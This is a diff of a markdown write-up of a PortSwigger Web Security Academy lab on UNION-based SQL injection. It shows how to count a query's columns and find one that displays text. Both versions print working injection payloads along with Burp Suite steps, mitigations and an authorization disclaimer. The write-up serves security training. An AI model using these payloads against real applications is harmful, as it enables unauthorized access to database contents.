@@ -1,261 +1,199 @@
-# SQL Injection UNION Attack – Finding a Column Containing Text
+# SQL Injection UNION Attack: Finding a Column Containing Text
 
-## Lab Information
+> **PortSwigger Web Security Academy Lab** demonstrating how to identify a column capable of displaying string values using a UNION-based SQL Injection.
 
-| Field | Value |
-|-------|-------|
-| Platform | PortSwigger Web Security Academy |
+---
+
+# Overview
+
+This lab demonstrates how to identify which column in a SQL query can display text values. Before sensitive data can be extracted using a UNION-based SQL Injection, it is necessary to determine both the number of columns returned by the original query and which column supports string data.
+
+---
+
+# Objective
+
+- Determine the number of columns returned by the query
+- Identify a column that accepts string values
+- Display arbitrary text within the application's response
+- Complete the lab using a UNION-based SQL Injection
+
+---
+
+# Lab Information
+
+| Item | Value |
+|------|-------|
 | Category | SQL Injection |
 | Technique | UNION-based SQL Injection |
 | Difficulty | Apprentice |
+| Platform | PortSwigger Web Security Academy |
 | Status | ✅ Solved |
 
 ---
 
-## Overview
+# Vulnerability
 
-This lab demonstrates how to identify which column in a SQL query is capable of displaying string (text) data during a UNION-based SQL injection attack.
+The application fails to properly sanitize user-controlled input before constructing a SQL query. By injecting a `UNION SELECT` statement, additional data can be returned in the application's response.
 
-After determining the total number of columns, the next objective is to discover which column accepts text values. Once identified, the provided target string is injected into the correct column to successfully complete the lab.
+To successfully exploit the vulnerability, the attacker must:
 
----
-
-## Objective
-
-- Determine the number of columns returned by the original query.
-- Identify the column capable of displaying text.
-- Inject the provided string into the correct column.
-- Successfully solve the lab.
+- Determine the correct number of columns
+- Identify which column supports string values
+- Inject arbitrary text into the application's response
 
 ---
 
-## Environment
+# Tools Used
 
-- PortSwigger Web Security Academy
 - Burp Suite Professional
 - Burp Repeater
 - Firefox
+- PortSwigger Web Security Academy
 
 ---
 
-## Methodology
+# Methodology
 
-### Step 1 — Intercept the Request
+## 1. Intercept the Request
 
-Capture the vulnerable request using Burp Suite Proxy and send it to Repeater.
+Capture the request to the **Gifts** category using Burp Suite.
 
-Example request:
+**Screenshot**
 
-```http
-GET /filter?category=Gifts HTTP/2
+```
+screenshots/01-proxy-http-history.png
 ```
 
 ---
 
-### Step 2 — Determine the Number of Columns
+## 2. Review the Original Response
 
-Test different UNION SELECT statements until the response is successful.
+Forward the request to Repeater and inspect the application's normal response.
 
-Successful payload:
+**Screenshot**
+
+```
+screenshots/02-original-response.png
+```
+
+---
+
+## 3. Test an Invalid UNION Payload
+
+Inject a UNION statement containing an invalid text placement.
+
+Example:
 
 ```sql
-' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 'abcd',NULL--
 ```
 
-Result:
+The server returns an error because the injected text is placed into a column that does not accept string values.
 
-- Total columns identified: **3**
+**Screenshot**
+
+```
+screenshots/03-invalid-payload.png
+```
 
 ---
 
-### Step 3 — Identify the Text Column
+## 4. Identify the Text-Compatible Column
 
-Insert a test string into each column individually.
+Move the text value to another column.
 
-Attempt 1
+Example:
 
 ```sql
-' UNION SELECT 'abcd',NULL,NULL--
+' UNION SELECT NULL,'abcd'--
 ```
 
-Response:
+The application successfully displays the injected string, confirming that the second column accepts text.
+
+**Screenshot**
 
 ```
-HTTP 500 Internal Server Error
+screenshots/04-valid-text-column.png
 ```
 
 ---
 
-Attempt 2
+## 5. Submit the Final Payload
+
+Replace the test string with the value requested by the lab.
+
+Example:
 
 ```sql
-' UNION SELECT NULL,'abcd',NULL--
+' UNION SELECT NULL,'YOUR-LAB-STRING'--
 ```
 
-Response:
+The application displays the required string in the response.
+
+**Screenshot**
 
 ```
-HTTP 200 OK
+screenshots/05-final-payload.png
 ```
-
-The string appeared in the application's response.
-
-Result:
-
-✅ Second column accepts text.
 
 ---
 
-### Step 4 — Retrieve the Target String
+## 6. Verify Lab Completion
 
-The lab provided the following string:
+After submitting the correct payload, the lab is marked as solved.
+
+**Screenshot**
 
 ```
-YUz0R9
+screenshots/06-lab-solved.png
 ```
 
-Inject the value into the identified text column.
+---
 
-Payload:
+# Payloads Used
+
+## Invalid Payload
 
 ```sql
-' UNION SELECT NULL,'YUz0R9',NULL--
+' UNION SELECT 'abcd',NULL--
 ```
 
 ---
 
-### Step 5 — Verify the Result
-
-The application accepted the payload and marked the lab as solved.
-
-Result:
-
-✅ Lab Solved Successfully
-
----
-
-## Payloads Used
-
-Determine columns
+## Valid Payload
 
 ```sql
-' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,'abcd'--
 ```
 
-Test first column
+---
+
+## Final Payload
 
 ```sql
-' UNION SELECT 'abcd',NULL,NULL--
-```
-
-Test second column
-
-```sql
-' UNION SELECT NULL,'abcd',NULL--
-```
-
-Final payload
-
-```sql
-' UNION SELECT NULL,'YUz0R9',NULL--
+' UNION SELECT NULL,'YOUR-LAB-STRING'--
 ```
 
 ---
 
-## Findings
+# Key Learning
 
-| Observation | Result |
-|------------|--------|
-| Number of columns | 3 |
-| Text-supported column | 2 |
-| Final payload | Successful |
-| Lab status | Solved |
+- UNION-based SQL Injection requires the correct number of columns.
+- Text values must be placed into a compatible column.
+- NULL values simplify column enumeration because they are compatible with most SQL data types.
+- Successfully identifying a text-compatible column is a prerequisite for extracting sensitive information using UNION-based attacks.
 
 ---
 
-## Screenshots
-
-### Step 1 — Proxy HTTP History
-
-![](screenshots/01-proxy-http-history.png)
-
----
-
-### Step 2 — Original Response
-
-![](screenshots/02-original-response.png)
-
----
-
-### Step 3 — Invalid Payload
-
-![](screenshots/03-invalid-payload.png)
-
----
-
-### Step 4 — Valid Text Column
-
-![](screenshots/04-valid-text-column.png)
-
----
-
-### Step 5 — Final Payload
-
-![](screenshots/05-final-payload.png)
-
----
-
-### Step 6 — Lab Solved
-
-![](screenshots/06-lab-solved.png)
-
----
-
-## Security Impact
-
-If exploited, UNION-based SQL Injection may allow an attacker to:
-
-- Read sensitive database information
-- Extract usernames and passwords
-- Enumerate database structure
-- Access confidential business data
-- Bypass intended application logic
-
----
-
-## Mitigation
-
-- Use parameterized queries (prepared statements)
-- Avoid dynamic SQL construction
-- Validate and sanitize user input
-- Apply least-privilege database permissions
-- Implement secure error handling
-- Deploy a Web Application Firewall (WAF)
-- Conduct regular security assessments
-
----
-
-## Skills Demonstrated
-
-- SQL Injection Testing
-- UNION-based Injection
-- Column Enumeration
-- Data Type Identification
-- Burp Suite Repeater
-- HTTP Request Analysis
-- Secure Documentation
-
----
-
-## References
+# References
 
 - PortSwigger Web Security Academy
-- OWASP SQL Injection Prevention Cheat Sheet
-- OWASP Web Security Testing Guide
+- OWASP Web Security Testing Guide (WSTG)
+- OWASP Top 10
 - CWE-89: SQL Injection
 
 ---
 
-## Disclaimer
+# Disclaimer
 
-This assessment was conducted exclusively within the PortSwigger Web Security Academy laboratory environment for educational purposes. All testing was performed on authorized systems.
+This write-up documents an authorized PortSwigger Web Security Academy laboratory exercise. All testing was performed in a controlled environment for educational purposes only.
